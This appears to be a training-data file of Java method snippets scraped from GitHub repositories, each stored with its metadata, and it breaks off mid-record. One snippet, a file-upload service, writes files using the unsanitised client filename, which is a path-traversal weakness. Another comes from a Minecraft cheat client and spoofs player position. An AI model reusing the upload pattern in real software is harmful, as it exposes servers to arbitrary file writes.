"throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void OnClick(){\n        Intent intent = new Intent(getContext(), OrderPayActivity.class);\n        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);\n        getActivity().startActivity(intent);\n\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/fragment/otc/OTCBuyFragment.java", "stars": "1", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 30091, "method_name": "getId", "class_name": "GrandFather", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_common_property/GrandFather.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30092, "method_name": "setId", "class_name": "GrandFather", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(Integer id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_common_property/GrandFather.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30093, "method_name": "getName", "class_name": "GrandFather", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {\n        return name;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_common_property/GrandFather.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30094, "method_name": "setName", "class_name": "GrandFather", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String name) {\n        this.name = name;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_common_property/GrandFather.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30095, "method_name": "initElements", "class_name": "JungleTanbarkBlock", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\n\t\telements.blocks.add(() -> new CustomBlock());\n\t\telements.items\n\t\t\t\t.add(() -> new BlockItem(block, new Item.Properties().group(ItemGroup.BUILDING_BLOCKS)).setRegistryName(block.getRegistryName()));\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/JungleTanbarkBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 30096, "method_name": "getDrops", "class_name": "CustomBlock", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\n\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\n\t\t\tif (!dropsOriginal.isEmpty())\n\t\t\t\treturn dropsOriginal;\n\t\t\treturn Collections.singletonList(new ItemStack(this, 1));\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/JungleTanbarkBlock.java", "stars": "2", "class_props": {"extends": "FallingBlock", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30097, "method_name": "setConfiguration", "class_name": "StatementExecutor", "params": ["Configuration"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setConfiguration(Configuration configuration) {\n        this.configuration = configuration;\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/executor/StatementExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30098, "method_name": "execute", "class_name": "StatementExecutor", "params": ["Statement", "RequestContext"], "throws": ["SQLException", "ClassNotFoundException"], "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object execute(Statement statement, RequestContext context) throws SQLException, ClassNotFoundException {\n        if (statement instanceof SqlStatement) {\n            return executeSqlStatement((SqlStatement) statement, context);\n        } else if (statement instanceof FunctionStatement) {\n            return executeFunctionStatement((FunctionStatement) statement, context);\n        }\n        return null;\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/executor/StatementExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30099, "method_name": "executeFunctionStatement", "class_name": "StatementExecutor", "params": ["FunctionStatement", "RequestContext"], "throws": ["ClassNotFoundException", "SQLException"], "modifiers": ["private"], "return_type": "Object", "snippet": "    private Object executeFunctionStatement(FunctionStatement functionStatement, RequestContext context) throws ClassNotFoundException, SQLException {\n        NodeList nodeList = functionStatement.getNodeList();\n        Object value = null;\n        for (int i = 0, len = nodeList.getLength(); i < len; i++) {\n            Node node = nodeList.item(i);\n            if (node.getNodeType() == Node.COMMENT_NODE) {\n                continue;\n            }\n            if (\"java\".equalsIgnoreCase(node.getNodeName())) {\n                // \u89e3\u6790\u7c7b\u540d\u548c\u65b9\u6cd5\u540d\n                String className = DomUtils.getNodeAttributeValue(node, \"class\");\n                Assert.isNotBlank(className, \"class\u4e0d\u80fd\u4e3a\u7a7a\uff01\");\n                String method = DomUtils.getNodeAttributeValue(node, \"method\");\n                Assert.isNotBlank(method, \"method\u4e0d\u80fd\u4e3a\u7a7a\uff01\");\n                // \u89e3\u6790\u53c2\u6570\n                NodeList values = (NodeList) DomUtils.evaluate(\"value\", node, XPathConstants.NODESET);\n                Object[] args = new Object[0];\n                if (values != null) {\n                    // \u53d6\u51fa\u53c2\u6570\u503c\n                    args = new Object[values.getLength()];\n                    for (int j = 0; j < args.length; j++) {\n                        // \u89e3\u6790\u8868\u8fbe\u5f0f\n                        String expression = values.item(j).getTextContent();\n                        if (StringUtils.isNotBlank(expression)) {\n                            args[j] = context.evaluate(expression.trim());\n                        }\n                    }\n                }\n                // \u8c03\u7528java\u65b9\u6cd5\n                value = executeJava(className, method, args);\n            } else if (\"execute-sql\".equalsIgnoreCase(node.getNodeName())) {\n                String sqlId = DomUtils.getNodeAttributeValue(node, \"id\");\n                Statement statement = configuration.getStatementById(sqlId);\n                Assert.isNotNull(statement, String.format(\"\u627e\u4e0d\u5230SQL:%s\", sqlId));\n                // \u89e3\u6790\u53c2\u6570\n                NodeList params = (NodeList) DomUtils.evaluate(\"param\", node, XPathConstants.NODESET);\n                if (params != null) {\n                    for (int j = 0, l = params.getLength(); j < l; j++) {\n                        Node param = params.item(j);\n                        String paramName = DomUtils.getNodeAttributeValue(param, \"name\");\n                        String paramValue = DomUtils.getNodeAttributeValue(param, \"value\");\n                        Assert.isNotBlanks(\"execute-sql/param\u7684\u53c2\u6570\u540d\u548c\u503c\u90fd\u4e0d\u80fd\u4e3a\u7a7a\", paramName, paramValue);\n                        // \u91cd\u65b0\u8986\u76d6\u503c\n                        context.put(paramName, context.evaluate(paramValue));\n                    }\n                }\n                //\u6267\u884cSQL\n                value = executeSqlStatement((SqlStatement) statement, context);\n            } else {\n                logger.warn(\"\u4e0d\u652f\u6301\u8282\u70b9{}\", node.getNodeName());\n                continue;\n            }\n            // \u8bbe\u7f6e\u8fd4\u56de\u503c\u91cd\u7f6e\u5230context\u4e2d\n            String returnVal = DomUtils.getNodeAttributeValue(node, \"return\");\n            if (StringUtils.isNotBlank(returnVal)) {\n                context.put(returnVal, value);\n            }\n        }\n        return value;\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/executor/StatementExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30100, "method_name": "executeJava", "class_name": "StatementExecutor", "params": ["String", "String", "Object"], "throws": ["ClassNotFoundException"], "modifiers": ["private"], "return_type": "Object", "snippet": "    private Object executeJava(String className, String methodName, Object... args) throws ClassNotFoundException {\n        Class<?> clazz = Class.forName(className);\n        Object target = null;\n        AbstractReflection reflection = AbstractReflection.getInstance();\n        Method method = (Method) reflection.getMethod(clazz, methodName, args);\n        Assert.isTrue(method != null, String.format(\"\u5728%s\u4e2d\u627e\u4e0d\u5230\u65b9\u6cd5%s\", className, methodName));\n        try {\n            target = applicationContext.getBean(clazz);\n        } catch (BeansException ignored) {\n            Assert.isTrue(Modifier.isStatic(method.getModifiers()), String.format(\"%s\u4e0d\u5728spring\u5bb9\u5668\u4e2d\u65f6%s\u5fc5\u987b\u662f\u9759\u6001\u65b9\u6cd5\", className, methodName));\n        }\n        return reflection.callMethod(target, method, args);\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/executor/StatementExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30101, "method_name": "executeSqlStatement", "class_name": "StatementExecutor", "params": ["SqlStatement", "RequestContext"], "throws": ["SQLException"], "modifiers": ["private"], "return_type": "Object", "snippet": "    private Object executeSqlStatement(SqlStatement sqlStatement, RequestContext context) throws SQLException {\n        if (sqlStatement.isPagination()) {  //\u5224\u65ad\u662f\u5426\u662f\u5206\u9875\u8bed\u53e5\n            // \u83b7\u53d6\u8981\u6267\u884c\u7684SQL\n            String sql = sqlStatement.getSqlNode().getSql(context).trim();\n            // \u4eceRequest\u4e2d\u63d0\u53d6Page\u5bf9\u8c61\n            Page page = pageProvider.getPage(context.getRequest());\n            // \u83b7\u53d6\u6570\u636e\u5e93\u65b9\u8a00\n            Dialect dialect = sqlExecutor.getDialect(sqlStatement.getDataSourceName());\n            PageResult<Object> pageResult = new PageResult<>();\n            // \u83b7\u53d6\u603b\u6761\u6570\n            long total = (long) sqlExecutor.execute(sqlStatement.getDataSourceName(), SqlMode.SELECT_ONE, dialect.getCountSql(sql), context.getParameters().toArray(), Long.class);\n            pageResult.setTotal(total);\n            // \u5f53\u6761\u6570>0\u65f6\uff0c\u6267\u884c\u67e5\u8be2\u8bed\u53e5\uff0c\u5426\u5219\u4e0d\u67e5\u8be2\u4ee5\u63d0\u9ad8\u6027\u80fd\n            if (total > 0) {\n                // \u83b7\u53d6\u5206\u9875\u8bed\u53e5\n                String pageSql = dialect.getPageSql(sql, context, page.getOffset(), page.getLimit());\n                // \u6267\u884c\u67e5\u8be2\n                pageResult.setList((List) sqlExecutor.execute(sqlStatement.getDataSourceName(), SqlMode.SELECT_LIST, pageSql, context.getParameters().toArray(), sqlStatement.getReturnType()));\n            }\n            return pageResult;\n        } else if (SqlMode.INSERT_WITH_PK == sqlStatement.getSqlMode()) {   //\u63d2\u5165\u8fd4\u56de\u4e3b\u952e\n            return sqlExecutor.executeInsertWithPk(sqlStatement, context);\n        } else {\n            // \u83b7\u53d6\u8981\u6267\u884c\u7684SQL\n            String sql = sqlStatement.getSqlNode().getSql(context).trim();\n            // \u666e\u901aSQL\u6267\u884c\n            return sqlExecutor.execute(sqlStatement.getDataSourceName(), sqlStatement.getSqlMode(), sql, context.getParameters().toArray(), sqlStatement.getReturnType());\n        }\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/executor/StatementExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30102, "method_name": "getLayoutId", "class_name": "ChatMessageAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getLayoutId(int viewType) {\n        int layoutId = 0;\n        switch (viewType) {\n            case TYPE_ITEM_CHATMESSAGE_OTHER:\n                layoutId = R.layout.item_chatmessage;\n                break;\n            case TYPE_ITEM_CHATMESSAGE_TIP:\n                layoutId = R.layout.item_chatmessage_tip;\n                break;\n        }\n        return layoutId;\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/adapter/ChatMessageAdapter.java", "stars": "2", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 30103, "method_name": "getItemViewType", "class_name": "ChatMessageAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getItemViewType(int position) {\n        return getData().get(position).getMsgType();\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/adapter/ChatMessageAdapter.java", "stars": "2", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 30104, "method_name": "convert", "class_name": "ChatMessageAdapter", "params": ["VH", "ChatMessage", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void convert(VH holder, ChatMessage data, int position) {\n        LogUtil.d(\"zhaochong\", \" rv  position : \" + position);\n        switch (data.getMsgType()) {\n            case TYPE_ITEM_CHATMESSAGE_OTHER:\n                handleContent(holder, data);\n                break;\n            case TYPE_ITEM_CHATMESSAGE_TIP:\n                holder.setText(R.id.tv_chatmessage_tip, data.getMessage());\n                break;\n        }\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/adapter/ChatMessageAdapter.java", "stars": "2", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 30105, "method_name": "handleContent", "class_name": "ChatMessageAdapter", "params": ["VH", "ChatMessage"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void handleContent(VH holder, ChatMessage data) {\n        TextView charmessage = holder.getView(R.id.tv_chatmessage);\n        charmessage.setText(data.getUid() + \": \" + data.getMessage());\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/adapter/ChatMessageAdapter.java", "stars": "2", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 30106, "method_name": "onCheckedChanged", "class_name": "ChipGroup_OnCheckedChangeListenerImplementor", "params": ["android", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onCheckedChanged (android.support.design.chip.ChipGroup p0, int p1)\n\t{\n\t\tn_onCheckedChanged (p0, p1);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/design/chip/ChipGroup_OnCheckedChangeListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 30107, "method_name": "n_onCheckedChanged", "class_name": "ChipGroup_OnCheckedChangeListenerImplementor", "params": ["android", "int"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onCheckedChanged (android.support.design.chip.ChipGroup p0, int p1);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/design/chip/ChipGroup_OnCheckedChangeListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 30108, "method_name": "monodroidAddReference", "class_name": "ChipGroup_OnCheckedChangeListenerImplementor", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/design/chip/ChipGroup_OnCheckedChangeListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 30109, "method_name": "monodroidClearReferences", "class_name": "ChipGroup_OnCheckedChangeListenerImplementor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/design/chip/ChipGroup_OnCheckedChangeListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 30110, "method_name": "setup", "class_name": "HibernateTimeZoneIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setup() {\n        dateTimeWrapper = new DateTimeWrapper();\n        dateTimeWrapper.setInstant(Instant.parse(\"2014-11-12T05:50:00.0Z\"));\n        dateTimeWrapper.setLocalDateTime(LocalDateTime.parse(\"2014-11-12T07:50:00.0\"));\n        dateTimeWrapper.setOffsetDateTime(OffsetDateTime.parse(\"2011-12-14T08:30:00.0Z\"));\n        dateTimeWrapper.setZonedDateTime(ZonedDateTime.parse(\"2011-12-14T08:30:00.0Z\"));\n        dateTimeWrapper.setLocalTime(LocalTime.parse(\"14:30:00\"));\n        dateTimeWrapper.setOffsetTime(OffsetTime.parse(\"14:30:00+02:00\"));\n        dateTimeWrapper.setLocalDate(LocalDate.parse(\"2016-09-10\"));\n\n        dateTimeFormatter = DateTimeFormatter\n            .ofPattern(\"yyyy-MM-dd HH:mm:ss.S\")\n            .withZone(ZoneId.of(\"UTC\"));\n\n        timeFormatter = DateTimeFormatter\n            .ofPattern(\"HH:mm:ss\")\n            .withZone(ZoneId.of(\"UTC\"));\n\n        dateFormatter = DateTimeFormatter\n            .ofPattern(\"yyyy-MM-dd\");\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/timezone/HibernateTimeZoneIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30111, "method_name": "storeInstantWithUtcConfigShouldBeStoredOnGMTTimeZone", "class_name": "HibernateTimeZoneIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void storeInstantWithUtcConfigShouldBeStoredOnGMTTimeZone() {\n        dateTimeWrapperRepository.saveAndFlush(dateTimeWrapper);\n\n        String request = generateSqlRequest(\"instant\", dateTimeWrapper.getId());\n        SqlRowSet resultSet = jdbcTemplate.queryForRowSet(request);\n        String expectedValue = dateTimeFormatter.format(dateTimeWrapper.getInstant());\n\n        assertThatDateStoredValueIsEqualToInsertDateValueOnGMTTimeZone(resultSet, expectedValue);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/timezone/HibernateTimeZoneIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30112, "method_name": "storeLocalDateTimeWithUtcConfigShouldBeStoredOnGMTTimeZone", "class_name": "HibernateTimeZoneIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void storeLocalDateTimeWithUtcConfigShouldBeStoredOnGMTTimeZone() {\n        dateTimeWrapperRepository.saveAndFlush(dateTimeWrapper);\n\n        String request = generateSqlRequest(\"local_date_time\", dateTimeWrapper.getId());\n        SqlRowSet resultSet = jdbcTemplate.queryForRowSet(request);\n        String expectedValue = dateTimeWrapper\n            .getLocalDateTime()\n            .atZone(ZoneId.systemDefault())\n            .format(dateTimeFormatter);\n\n        assertThatDateStoredValueIsEqualToInsertDateValueOnGMTTimeZone(resultSet, expectedValue);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/timezone/HibernateTimeZoneIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30113, "method_name": "storeOffsetDateTimeWithUtcConfigShouldBeStoredOnGMTTimeZone", "class_name": "HibernateTimeZoneIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void storeOffsetDateTimeWithUtcConfigShouldBeStoredOnGMTTimeZone() {\n        dateTimeWrapperRepository.saveAndFlush(dateTimeWrapper);\n\n        String request = generateSqlRequest(\"offset_date_time\", dateTimeWrapper.getId());\n        SqlRowSet resultSet = jdbcTemplate.queryForRowSet(request);\n        String expectedValue = dateTimeWrapper\n            .getOffsetDateTime()\n            .format(dateTimeFormatter);\n\n        assertThatDateStoredValueIsEqualToInsertDateValueOnGMTTimeZone(resultSet, expectedValue);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/timezone/HibernateTimeZoneIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30114, "method_name": "storeZoneDateTimeWithUtcConfigShouldBeStoredOnGMTTimeZone", "class_name": "HibernateTimeZoneIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void storeZoneDateTimeWithUtcConfigShouldBeStoredOnGMTTimeZone() {\n        dateTimeWrapperRepository.saveAndFlush(dateTimeWrapper);\n\n        String request = generateSqlRequest(\"zoned_date_time\", dateTimeWrapper.getId());\n        SqlRowSet resultSet = jdbcTemplate.queryForRowSet(request);\n        String expectedValue = dateTimeWrapper\n            .getZonedDateTime()\n            .format(dateTimeFormatter);\n\n        assertThatDateStoredValueIsEqualToInsertDateValueOnGMTTimeZone(resultSet, expectedValue);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/timezone/HibernateTimeZoneIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30115, "method_name": "storeLocalTimeWithUtcConfigShouldBeStoredOnGMTTimeZoneAccordingToHis1stJan1970Value", "class_name": "HibernateTimeZoneIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void storeLocalTimeWithUtcConfigShouldBeStoredOnGMTTimeZoneAccordingToHis1stJan1970Value() {\n        dateTimeWrapperRepository.saveAndFlush(dateTimeWrapper);\n\n        String request = generateSqlRequest(\"local_time\", dateTimeWrapper.getId());\n        SqlRowSet resultSet = jdbcTemplate.queryForRowSet(request);\n        String expectedValue = dateTimeWrapper\n            .getLocalTime()\n            .atDate(LocalDate.of(1970, Month.JANUARY, 1))\n            .atZone(ZoneId.systemDefault())\n            .format(timeFormatter);\n\n        assertThatDateStoredValueIsEqualToInsertDateValueOnGMTTimeZone(resultSet, expectedValue);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/timezone/HibernateTimeZoneIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30116, "method_name": "storeOffsetTimeWithUtcConfigShouldBeStoredOnGMTTimeZoneAccordingToHis1stJan1970Value", "class_name": "HibernateTimeZoneIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void storeOffsetTimeWithUtcConfigShouldBeStoredOnGMTTimeZoneAccordingToHis1stJan1970Value() {\n        dateTimeWrapperRepository.saveAndFlush(dateTimeWrapper);\n\n        String request = generateSqlRequest(\"offset_time\", dateTimeWrapper.getId());\n        SqlRowSet resultSet = jdbcTemplate.queryForRowSet(request);\n        String expectedValue = dateTimeWrapper\n            .getOffsetTime()\n            .toLocalTime()\n            .atDate(LocalDate.of(1970, Month.JANUARY, 1))\n            .atZone(ZoneId.systemDefault())\n            .format(timeFormatter);\n\n        assertThatDateStoredValueIsEqualToInsertDateValueOnGMTTimeZone(resultSet, expectedValue);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/timezone/HibernateTimeZoneIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30117, "method_name": "storeLocalDateWithUtcConfigShouldBeStoredWithoutTransformation", "class_name": "HibernateTimeZoneIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void storeLocalDateWithUtcConfigShouldBeStoredWithoutTransformation() {\n        dateTimeWrapperRepository.saveAndFlush(dateTimeWrapper);\n\n        String request = generateSqlRequest(\"local_date\", dateTimeWrapper.getId());\n        SqlRowSet resultSet = jdbcTemplate.queryForRowSet(request);\n        String expectedValue = dateTimeWrapper\n            .getLocalDate()\n            .format(dateFormatter);\n\n        assertThatDateStoredValueIsEqualToInsertDateValueOnGMTTimeZone(resultSet, expectedValue);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/timezone/HibernateTimeZoneIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30118, "method_name": "generateSqlRequest", "class_name": "HibernateTimeZoneIT", "params": ["String", "long"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String generateSqlRequest(String fieldName, long id) {\n        return format(\"SELECT %s FROM gardle_date_time_wrapper where id=%d\", fieldName, id);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/timezone/HibernateTimeZoneIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30119, "method_name": "assertThatDateStoredValueIsEqualToInsertDateValueOnGMTTimeZone", "class_name": "HibernateTimeZoneIT", "params": ["SqlRowSet", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void assertThatDateStoredValueIsEqualToInsertDateValueOnGMTTimeZone(SqlRowSet sqlRowSet, String expectedValue) {\n        while (sqlRowSet.next()) {\n            String dbValue = sqlRowSet.getString(1);\n\n            assertThat(dbValue).isNotNull();\n            assertThat(dbValue).isEqualTo(expectedValue);\n        }\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/timezone/HibernateTimeZoneIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30120, "method_name": "uploadFile", "class_name": "FileUploadServiceImpl", "params": ["MultipartFile"], "throws": null, "modifiers": ["public"], "return_type": "FileInfo", "snippet": "    public FileInfo uploadFile(MultipartFile file) {\n\n        String dateStr = new SimpleDateFormat(\"yyyyMMdd\").format(DateUtil.now());\n        String fileName = file.getOriginalFilename();\n        String path = UPLOAD_DIR + dateStr + FILE_SEPARATOR + fileName;\n\n        File fileInDisk = new File(path);\n\n        if (!fileInDisk.getParentFile().exists()) {\n            // \u4e0d\u5b58\u5728\u7684\u76ee\u5f55 \u521b\u5efa\u5b83\uff01\n            fileInDisk.getParentFile().mkdirs();\n        }\n\n        // \u4fdd\u5b58\u6587\u4ef6\n        try {\n            file.transferTo(fileInDisk);\n        } catch (IOException e) {\n            throw new FileUploadException(\"Upload file error. \" + e.getMessage());\n        }\n\n        String baseUrl = optionService.getBlogBaseUrl();\n        String fileUrl = baseUrl + FILE_URL_PREFIX + dateStr + \"/\" + fileName;\n\n        return new FileInfo(fileName, fileUrl, (int) file.getSize() / 1024);\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/service/impl/FileUploadServiceImpl.java", "stars": "1", "class_props": {"extends": null, "implements": ["FileUploadService"], "modifiers": ["public"]}}, {"id": 30121, "method_name": "onBoundingBox", "class_name": "Jesus", "params": ["CollisionBoxEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBoundingBox(CollisionBoxEvent event) {\n        if (mc.player == null)\n            return;\n        if (((event.getBlock() instanceof BlockLiquid)) && event.getEntity() == mc.player\n                && !EntityUtil.isInLiquid() && (mc.player.fallDistance < 3.0F) && (!mc.player.isSneaking())) {\n            event.setAABB(Block.FULL_BLOCK_AABB);\n        }\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/modules/movement/Jesus.java", "stars": "12", "class_props": {"extends": "Module", "implements": null, "modifiers": ["public"]}}, {"id": 30122, "method_name": "onJump", "class_name": "Jesus", "params": ["JumpEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onJump(JumpEvent event) {\n        if (EntityUtil.isColliding(0, -0.8, 0) instanceof BlockLiquid && !EntityUtil.isInLiquid())\n            MotionUtil.setSpeed(mc.player, MotionUtil.getBaseMoveSpeed() - 0.24);\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/modules/movement/Jesus.java", "stars": "12", "class_props": {"extends": "Module", "implements": null, "modifiers": ["public"]}}, {"id": 30123, "method_name": "onUpdate", "class_name": "Jesus", "params": ["UpdateEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onUpdate(UpdateEvent event) {\n        if (mc.gameSettings.keyBindSneak.isKeyDown())\n            return;\n        if (EntityUtil.isInLiquid()) {\n            if (event.getTiming().equals(EventTiming.PRE))\n                mc.player.motionY = 0.1;\n        }\n        if (mode.equalsIgnoreCase(\"solid\") && event.getTiming().equals(EventTiming.PRE)) {\n            if (EntityUtil.isColliding(0, -0.1, 0) instanceof BlockLiquid && !EntityUtil.isInLiquid()) {\n                event.getLocation().setY(mc.player.posY + (mc.player.ticksExisted % 2 == 0 ? 0.01 : -0.01));\n                event.getLocation().setOnGround(mc.player.ticksExisted % 2 != 0);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/modules/movement/Jesus.java", "stars": "12", "class_props": {"extends": "Module", "implements": null, "modifiers": ["public"]}}, {"id": 30124, "method_name": "generateCode", "class_name": "StmDISPOSE", "params": [], "throws": ["CodeException"], "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String generateCode() throws CodeException {\n\t\tString result = \"\";\n\t\tresult += 